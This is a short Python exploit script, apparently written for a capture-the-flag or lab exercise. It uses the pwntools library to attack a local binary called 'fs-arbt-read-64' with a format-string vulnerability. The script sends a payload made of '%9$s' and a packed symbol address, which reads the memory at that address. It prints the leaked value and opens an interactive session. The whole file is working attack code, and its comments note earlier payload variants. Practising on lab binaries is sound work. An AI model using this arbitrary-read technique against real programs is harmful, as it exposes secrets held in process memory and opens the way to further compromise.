#!/usr/bin/env python

from pwn import *

p = process("./fs-arbt-read-64")

addr_rand = p.elf.symbols['random_value'];

print(hex(addr_rand))

print(p.recv())

# buf = "AAAA%7$p"
# addr_rand instead of AAAA
#buf = p32(addr_rand)+"%7$p"
# Dereference the pointer and read as string instead.
buf = "%9$sAAAA"+p64(addr_rand)

p.sendline(buf)

p.recvuntil("Hello ")
val = hex(u32(p.recv(4)))

print(val)

# P\xa0\x04\x08\xb4\xac\xb3\xce
# The first four bytes are our p32'd address.
# The next four bytes are the string cast of the number.

#data.split(' ')[1].split('\n')[4:8]

p.interactive()
